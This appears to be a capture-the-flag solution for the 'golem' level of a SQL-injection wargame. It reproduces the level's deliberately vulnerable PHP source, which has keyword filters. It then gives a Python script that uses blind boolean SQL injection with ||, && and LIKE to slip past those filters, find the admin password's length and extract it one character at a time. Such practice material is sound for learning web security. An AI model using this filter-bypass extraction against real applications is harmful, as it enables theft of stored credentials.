'''
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
'''
import requests
from urllib import parse
from bs4 import BeautifulSoup as bs

host = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="
cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}
password_length = 0
s = requests.Session()

print("password length find start!!")
for i in range(1, 100) :    
    param = f"' || id like 'admin' && length(pw) > {i} -- -"
    res = s.get(host + parse.quote(param), cookies=cookies)
    if "Hello admin" not in res.text :
        print(f"password length is {i}")
        password_length = i
        break 
print("password length find end !!")

# 패스워드 추출
admin_password = ""
for i in range(1, password_length + 1) :
    for j in range(47, 123) : # 48~57 0~9 / 65 ~90 A-Z 97~122 a-z    
        param = f"'||id like 'admin' && pw like '{admin_password}{chr(j)}%' -- -"
        #param = f"'||id like 'admin' && ascii(substr(pw, {str(i)}, 1)) like {str(j)} -- -"
        res = s.get(host + parse.quote(param), cookies=cookies)
        if "No Hack ~_~" in res.text :
          print("no use prob keyword")
          break
        if "Hello admin" in res.text :
          admin_password += chr(j)            
          break
    print(f"now password ... {admin_password}")
print(f"admin password is {admin_password}") # 이거 소문자임...
